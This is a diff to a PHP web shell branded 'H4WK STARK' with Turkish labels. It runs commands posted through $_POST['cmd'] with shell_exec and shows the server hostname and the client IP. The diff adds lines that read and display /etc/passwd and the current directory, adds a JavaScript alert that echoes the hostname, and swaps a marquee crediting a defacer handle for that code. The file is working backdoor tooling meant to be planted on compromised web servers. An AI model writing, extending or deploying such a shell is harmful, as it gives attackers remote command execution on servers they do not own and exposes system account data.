@@ -7,8 +7,7 @@ if (!empty($_POST['cmd'])) {
     $çıktı1 = shell_exec('hostname');
     echo "<h4> Host adı => $çıktı1</h4>";
     echo "<h4>Client İp  : </h4>";
-    echo $_SERVER["REMOTE_ADDR"] ;
-
+    echo $_SERVER["REMOTE_ADDR"] ;	
 ?>
 </center>
 <!DOCTYPE html>
@@ -27,7 +26,7 @@ if (!empty($_POST['cmd'])) {
         body {
             font-family: sans-serif;
             color: rgba(0, 0, 0, .75);
-            background-color: slategray;
+            background-color: gray;
         }
 
         main {
@@ -93,6 +92,9 @@ if (!empty($_POST['cmd'])) {
 
 <body>
     <main>
+	<script>
+  alert("Merhaba ,<?php echo "$çıktı1"; ?>");
+</script>
         <code><h1>H4WK STARK - Web Shell</h1></code>
         <code><h3>instagram -> @faruguncodelari </h3></code>
         <h2>Komut Çalıştır - Execute a command </h2>
@@ -121,7 +123,12 @@ if (!empty($_POST['cmd'])) {
            background-color: black;
         }
     </style>
-        <code><font size="5" color="red"><marquee> Github : hawk-unity / instagram : faruguncodelari  / YouTube : HAWK DEFACER</marquee></font></code>
+	<?php
+	$etc = shell_exec('cat /etc/passwd');
+    echo "<pre> Etc Passwd => $etc</pre>";
+	$pwd = shell_exec('pwd');
+    echo "<pre>Bulunulan dizin => $pwd"
+	?>
     </main>
 </body>
 </html>
